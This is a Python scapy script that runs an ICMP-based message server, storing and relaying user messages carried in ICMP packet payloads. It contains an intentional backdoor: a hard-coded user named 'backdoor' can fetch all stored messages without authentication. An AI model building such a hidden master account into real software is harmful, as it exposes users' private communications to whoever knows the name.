#!/usr/bin/python

from messages_db import MessagesDB, DATA_BASE_NAME
import scapy.all as scapy
from network import *

# Default values for packets
ICMP_PROTOCOL = 'icmp'
DEFAULT_TTL = 20
DEFAULT_TIMEOUT = 2

# Labels for send and receive packets
GET_MESSAGES_LABEL = 'getmessages'
SEND_MSG = 'messages#'
MESSAGES_LABEL = 'send'

# separator in packets
SEPARATOR = '#'
CODING = 'utf-8'

# user that can receiving all messages
SUPER_USER = 'backdoor'


def generate_package(ip, message):
    """Function generate packet that will be send to user"""
    return scapy.IP(dst=ip, ttl=DEFAULT_TTL) / scapy.ICMP() / (message)


def sniffer(data_base, broadcast_addr):
    """Function catched I/O packet"""
    catched_packtes = scapy.sniff(filter=ICMP_PROTOCOL + ' and dst ' + broadcast_addr, timeout=DEFAULT_TIMEOUT)

    for packet in catched_packtes:
        process_packet(packet, data_base)


def process_packet(packet, database):
    """Function parse input packet"""
    try:
        # get source ip address from IP header
        src_ip_addr = packet.getlayer(scapy.IP).src
        packet_load = packet.getlayer(scapy.Raw).load
        raw_str = str(packet_load.decode(CODING))

        # get messages from database
        if raw_str.find(GET_MESSAGES_LABEL) == 0:
            messages_list = get_messages(raw_str, database)
            # send messages to receiver
            send_messages(messages_list, src_ip_addr)
        # save user message in database
        elif raw_str.find(MESSAGES_LABEL) == 0:
            result = raw_str.split(SEPARATOR)
            req_type, user_name, date_time, msg = result
            database.add_message_to_db(user_name, date_time,msg)
    except UnicodeDecodeError:
        pass
    except AttributeError:
        pass


def get_messages(raw_str, data_base):
    """Function return all messages from @data_base by @user_name"""
    result = raw_str.split(SEPARATOR)

    if (len(result) == 2):
        # unpack request type and user name
        req_type, name = result
        message_list = []
        # if 'backdoor' name - get all messages
        if (name == SUPER_USER):
            message_list = data_base.get_messages(name, select_all=True)
        else:
            # get message only that designed for @name
            message_list = data_base.get_messages(name)
            # delete messages from database
            data_base.del_messages(name)
        return message_list


def send_messages(messages_list, src_ip_addr):
    """Function send messages to receiver"""
    msgs = []
    for message in messages_list:
        msgs.append(str(message[1].decode(CODING) + message[2].decode(CODING)))

    m_string = SEPARATOR.join(msgs)
    scapy.send(generate_package(src_ip_addr, (SEND_MSG + m_string)))


if __name__ == '__main__':
    db = MessagesDB(DATA_BASE_NAME)
    network_obj = Get_broadcast()

    IP1 = network_obj.get_net_ip()
    BROADCAST_IP = network_obj.get_broadcast_ip()

    while True:
        sniffer(db, BROADCAST_IP)
